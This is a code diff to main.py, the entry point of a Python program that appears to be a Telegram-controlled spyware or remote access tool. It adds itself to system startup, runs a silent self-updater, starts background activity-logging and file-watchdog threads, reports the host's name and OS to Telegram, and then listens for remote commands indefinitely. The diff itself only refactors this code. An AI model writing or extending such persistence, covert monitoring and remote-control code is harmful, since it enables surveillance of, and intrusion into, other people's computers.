@@ -1,24 +1,31 @@
 # main.py
 
+import sys
+import os
+import time
+import socket
+import platform
+import threading
+from datetime import datetime
+
 from single_instance import ensure_single_instance
 from file_monitor import start_file_watchdog
-# 🔒 Ensure only one instance runs
-mutex = ensure_single_instance()
-
 from telegram_client import TelegramClient
 from logger import setup_logger
 from startup import add_to_startup
 from network import wait_for_internet
-from datetime import datetime
-import socket
-import platform
-import sys
-import os
-import time
-import threading
-from activity_logger import start_logging # Import the new logger
+from activity_logger import start_logging
 from update_manager import UpdateManager
+
+
 logger = setup_logger()
+
+
+# 🔒 Ensure only one instance runs
+mutex = ensure_single_instance()
+if not mutex:
+    logger.warning("Another instance is already running. Exiting.")
+    sys.exit(0)
 
 
 def get_executable_path():
@@ -31,41 +38,71 @@ def get_system_info() -> str:
     hostname = socket.gethostname()
     os_name = platform.system()
     os_version = platform.version()
-    boot_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    app_start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     return (
         f"🖥 <b>System Started</b>\n"
         f"• Hostname: {hostname}\n"
         f"• OS: {os_name} {os_version}\n"
-        f"• Time: {boot_time}"
+        f"• Time: {app_start_time}"
     )
+
+
+# ===============================
+# Safe Thread Wrappers
+# ===============================
+
+def safe_activity_logger():
+    try:
+        logger.info("Activity logger thread started")
+        start_logging()
+    except Exception:
+        logger.exception("Activity logger crashed unexpectedly")
+
+
+def safe_file_watchdog():
+    try:
+        logger.info("File watchdog thread started")
+        start_file_watchdog()
+    except Exception:
+        logger.exception("File watchdog crashed unexpectedly")
 
 
 def main():
     logger.info("Application started")
 
-    # Register startup once
+    # Register startup
     exe_path = get_executable_path()
     add_to_startup(exe_path)
 
     # Give system some breathing room
-    time.sleep(15)
+    time.sleep(10)
+
     # Wait for internet
     if not wait_for_internet(timeout=90):
         logger.error("Startup aborted: No internet")
         return
 
-    # Only run updater when packaged EXE
+    # Run updater only when packaged EXE
     if getattr(sys, 'frozen', False):
         logger.info("Checking for updates in background...")
         updater = UpdateManager(silent=True, logger=logger)
         updater.start()
 
-    logger.info("Starting background activity logger...")
-    threading.Thread(target=start_logging, daemon=True).start()
+    # Start background threads with names
+    threading.Thread(
+        target=safe_activity_logger,
+        daemon=True,
+        name="ActivityLoggerThread"
+    ).start()
 
-    threading.Thread(target=start_file_watchdog, daemon=True).start()
+    threading.Thread(
+        target=safe_file_watchdog,
+        daemon=True,
+        name="FileWatchdogThread"
+    ).start()
 
+    # Initialize Telegram client
     client = TelegramClient()
 
     # Send startup message
@@ -74,16 +111,16 @@ def main():
     else:
         logger.info("Startup message delivered successfully")
 
-    # Small cooldown
-    time.sleep(10)
+    time.sleep(5)
 
     # Enter persistent listener
+    logger.info("Entering Telegram listener loop")
     client.listen_forever()
 
 
 if __name__ == "__main__":
     try:
         main()
-    except Exception as e:
-        logger.critical(f"Fatal error: {e}", exc_info=True)
+    except Exception:
+        logger.critical("Fatal error occurred in main()", exc_info=True)
         sys.exit(1)
